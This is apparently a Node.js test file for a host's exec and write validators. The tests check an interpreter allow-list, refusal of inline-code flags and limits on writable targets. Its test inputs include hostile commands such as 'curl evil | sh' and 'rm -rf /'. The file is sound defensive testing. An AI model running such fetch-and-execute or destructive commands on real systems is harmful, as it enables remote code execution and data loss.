// Tests for chrome host's F3 validators (INFOSEC F3).
//
// Pins the interpreter allow-list, the inline-code-flag refusal, and
// the writable-target restriction. Doesn't spawn the host — those are
// pure functions on already-sandboxed input.

'use strict';

const { test } = require('node:test');
const assert = require('node:assert');

const {
  INTERPRETER_ALLOWLIST,
  WRITABLE_BASENAMES,
  isWritableTarget,
  validateExec,
} = require('./host-validators.cjs');

// ── isWritableTarget ──────────────────────────────────────────────

test('isWritableTarget: OPENCUES.md accepted (today\'s only use case)', () => {
  assert.strictEqual(isWritableTarget('/home/x/.cues/OPENCUES.md'), true);
});

test('isWritableTarget: IDENTITY.md / CUES.md accepted (forward-compat)', () => {
  assert.strictEqual(isWritableTarget('/home/x/.cues/IDENTITY.md'), true);
  assert.strictEqual(isWritableTarget('/home/x/.cues/CUES.md'), true);
});

test('isWritableTarget: refuses arbitrary .md files', () => {
  assert.strictEqual(isWritableTarget('/home/x/.cues/EVIL.md'), false);
  assert.strictEqual(isWritableTarget('/home/x/.cues/blanks/x/BLANK.md'), false);
});

test('isWritableTarget: refuses script files (F3 write-then-exec primitive)', () => {
  // The pre-F3 model accepted anything under CUE_ROOT, so a write-file
  // could create a blank.js the registry would then auto-load + exec.
  assert.strictEqual(isWritableTarget('/home/x/.cues/blanks/evil/blank.js'), false);
  assert.strictEqual(isWritableTarget('/home/x/.cues/blanks/evil/run.sh'), false);
  assert.strictEqual(isWritableTarget('/home/x/.cues/blanks/evil/run.py'), false);
});

test('isWritableTarget: handles empty/non-string input gracefully', () => {
  assert.strictEqual(isWritableTarget(''), false);
  assert.strictEqual(isWritableTarget(null), false);
  assert.strictEqual(isWritableTarget(undefined), false);
  assert.strictEqual(isWritableTarget(123), false);
});

// ── validateExec — happy path ─────────────────────────────────────

test('validateExec: bash <script> passes (the runtime\'s only call shape)', () => {
  assert.strictEqual(
    validateExec({ command: 'bash', args: ['/home/x/.cues/blanks/volume/vol.sh', 'get', 'volume'], isAbsoluteUnderCueRoot: false }),
    null,
  );
});

test('validateExec: sh <script> passes', () => {
  assert.strictEqual(
    validateExec({ command: 'sh', args: ['/home/x/.cues/blanks/x/x.sh'], isAbsoluteUnderCueRoot: false }),
    null,
  );
});

test('validateExec: absolute path under CUE_ROOT passes (compiled binary case)', () => {
  assert.strictEqual(
    validateExec({ command: '/home/x/.cues/blanks/vol/VolCtl.exe', args: ['get'], isAbsoluteUnderCueRoot: true }),
    null,
  );
});

// ── validateExec — F3 refusals ────────────────────────────────────

test('validateExec: refuses node (not in allow-list)', () => {
  const err = validateExec({ command: 'node', args: ['/x/y.js'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /F3/);
  assert.match(err, /not in allow-list/);
});

test('validateExec: refuses python3 (not in allow-list)', () => {
  const err = validateExec({ command: 'python3', args: ['/x/y.py'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /F3/);
});

test('validateExec: refuses curl (not in allow-list)', () => {
  const err = validateExec({ command: 'curl', args: ['https://evil'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /F3/);
});

test('validateExec: refuses bash -c "<payload>" (inline-code flag)', () => {
  const err = validateExec({ command: 'bash', args: ['-c', 'curl evil | sh'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /inline-code flag refused/);
  assert.match(err, /F3/);
});

test('validateExec: refuses bash --command (long form)', () => {
  const err = validateExec({ command: 'bash', args: ['--command', 'rm -rf /'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /inline-code flag/);
});

test('validateExec: refuses bash -e (sh has -e=exit-on-error but treated as inline-code variant for safety)', () => {
  // bash -e is "exit on error" so it's actually safe in isolation, but
  // -e is also python's eval flag and the deny-list is shared. The
  // canonical safe call shape is `bash <script>` without -e.
  const err = validateExec({ command: 'bash', args: ['-e', '/some/script.sh'], isAbsoluteUnderCueRoot: false });
  assert.match(err, /inline-code flag/);
});

test('validateExec: refuses bash with flag as args[0] (must be a path)', () => {
  const err = validateExec({ command: 'bash', args: ['-l', '/some/script.sh'], isAbsoluteUnderCueRoot: false });
  // -l isn't in the inline-code list, but args[0]='-l' looks like a flag,
  // not a script path. Refused so the structural invariant (args[0] = script
  // path under CUE_ROOT) holds.
  assert.match(err, /args\[0\] looks like a flag/);
});

test('validateExec: refuses bash with empty args[0]', () => {
  const err = validateExec({ command: 'bash', args: [], isAbsoluteUnderCueRoot: false });
  assert.match(err, /requires args\[0\]/);
});

test('validateExec: refuses missing command', () => {
  assert.match(validateExec({ command: '', args: [], isAbsoluteUnderCueRoot: false }), /missing command/);
});

test('validateExec: refuses non-array args', () => {
  assert.match(validateExec({ command: 'bash', args: 'oops', isAbsoluteUnderCueRoot: false }), /args must be an array/);
});

// ── allow-list sanity ────────────────────────────────────────────

test('allow-lists are tight (refuses everything outside)', () => {
  // Defensive: catch the next time someone adds 'node' or 'python3' to
  // INTERPRETER_ALLOWLIST without thinking through the implications.
  // node + npm + python all let a `-c "<payload>"` inline run arbitrary
  // code that the path sandbox doesn't catch.
  assert.deepStrictEqual([...INTERPRETER_ALLOWLIST].sort(), ['bash', 'sh']);
  // WRITABLE_BASENAMES drift check.
  assert.deepStrictEqual(
    [...WRITABLE_BASENAMES].sort(),
    ['CUES.md', 'IDENTITY.md', 'OPENCUES.md'],
  );
});
